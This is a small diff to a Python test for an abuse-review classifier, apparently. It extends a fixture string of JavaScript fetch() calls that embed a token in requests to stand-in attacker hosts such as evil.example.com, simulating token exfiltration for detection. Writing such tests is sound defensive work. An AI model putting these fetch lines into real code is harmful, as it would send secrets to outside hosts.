@@ -361,7 +361,10 @@ class TestAbuseReview(AbuseClassificationTestCase):
             mappings=[],
             masking=None,
         )
-        old_code = f"fetch('http://{token}@evil.example.com/');fetch('https://{token}.relay.example.com/x')"
+        old_code = (
+            f"fetch('http://{token}@evil.example.com/');fetch('https://{token}.relay.example.com/x');"
+            f"fetch('https://relay-{token}.example.com/')"
+        )
         self.log(destination, "updated", changes=[{"field": "hog", "after": old_code}])
         self.log(
             destination,
